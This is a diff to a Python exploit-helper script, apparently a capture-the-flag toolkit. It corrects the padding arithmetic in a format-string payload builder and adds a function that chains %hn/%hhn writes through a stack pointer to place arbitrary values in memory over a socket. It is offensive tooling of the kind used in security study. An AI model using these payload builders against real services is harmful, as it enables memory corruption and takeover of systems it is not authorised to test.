@@ -45,7 +45,7 @@ def fmtchar(prev_word,word,index,byte = 1):
     elif word == prev_word :
         result = 0
     else :
-        result = 256 - prev_word + word
+        result = 256**byte - prev_word + word
         fmt += "%" + str(result) + "c"
     if byte == 2 :
         fmt += "%" + str(index) + "$hn"
@@ -54,6 +54,25 @@ def fmtchar(prev_word,word,index,byte = 1):
     else :
         fmt += "%" + str(index) + "$hhn"
     return fmt
+
+#chain : ptr->addr->val
+#use ptr to modify addr
+#then use addr to modify val
+def fmtchain(sock,ptrindex,addrindex,addr,val,recpat,byte = 1):
+    for i in range(4/byte):
+        recvuntil(sock,recpat)
+        prev = 0
+        payload = ""
+        word =  (val >> i*byte*8 ) & (0x100**byte-1)
+        payload += fmtchar(prev, word ,addrindex,byte)
+        prev = word
+        if i < 4/byte-1 :
+            word = (addr+byte) & (0x100**byte-1)
+            payload += fmtchar(prev,  word ,ptrindex,byte)
+            prev = word
+            addr += byte
+        sendline(sock,payload)
+
 
 def sc(arch="x86"):
     if arch == "x86":
